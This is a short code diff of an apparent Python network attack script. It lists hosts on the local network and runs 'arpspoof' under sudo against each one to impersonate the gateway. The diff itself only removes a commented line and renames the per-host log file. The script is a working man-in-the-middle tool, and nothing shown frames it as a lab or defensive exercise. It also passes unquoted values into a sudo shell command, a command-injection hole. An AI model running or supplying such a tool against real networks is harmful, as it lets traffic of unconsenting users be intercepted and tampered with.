@@ -35,7 +35,6 @@ def get_neigh(iface,gw):
         if ip.split()!=gw.split():
             ip_table.append(ip.split())
     f_ips.close()
-    # ip_table.remove(['192.168.1.1'])
     for i,ip in enumerate(ip_table):
         print(Fore.WHITE+'----------------------')
         print(ip[0] + Fore.GREEN+" Found")
@@ -45,7 +44,7 @@ def get_neigh(iface,gw):
 
 def spoof(iface,ip,gw,i):
     try:
-        spoof_cmd=""" sudo /bin/bash -c 'arpspoof -i {} -t {}  {}' > log_{}-{}""".format(iface,ip,gw,i,gw.split("."))
+        spoof_cmd=""" sudo /bin/bash -c 'arpspoof -i {} -t {}  {}' > log_{}.txt""".format(iface,ip,gw,i)
         os.system(spoof_cmd)
     except Exception as err:
         print(err)
